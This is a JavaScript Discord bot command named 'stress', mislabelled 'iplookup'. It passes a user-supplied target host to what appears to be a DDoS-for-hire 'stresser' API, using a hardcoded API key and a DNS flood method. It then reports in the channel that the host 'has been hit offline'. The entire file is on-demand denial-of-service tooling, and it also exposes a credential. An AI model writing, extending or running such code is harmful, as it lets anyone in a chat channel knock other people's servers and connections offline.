const { Client, Intents, MessageEmbed } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });
const axios = require('axios').default;

module.exports= {
    name: 'stress',
    description: "iplookup",
    execute(message, args){
    const host = args.shift();
    const port = args.shift();
    const time = args.shift();
    const method = args.shift();
        axios.get(`https://onyxstresser.com/api/api.php?key=21iDeQCyP32pcMid&host=${host}&port=53&time=30&method=DNS&totalservers=1&vip=1`)
        .then(function (response) {
        let embed = new MessageEmbed();
        embed.setDescription(host + " has been hit offline");
        message.channel.send(embed);
        let penis = new MessageEmbed();
        penis.setColor("#FF0000")
        penis.setTitle("Debug Information")
        penis.setDescription(response.data);
        message.channel.send(penis);
            //message.channel.send("```" + response.data + "```");
            //message.channel.send("```" + host + " | " + port + " | " + time + " | " + method + "```")
            // handle success
            //console.log(response);
         })
        .catch(function (error) {
         // handle error
        console.log(error);
        
  })
    }
}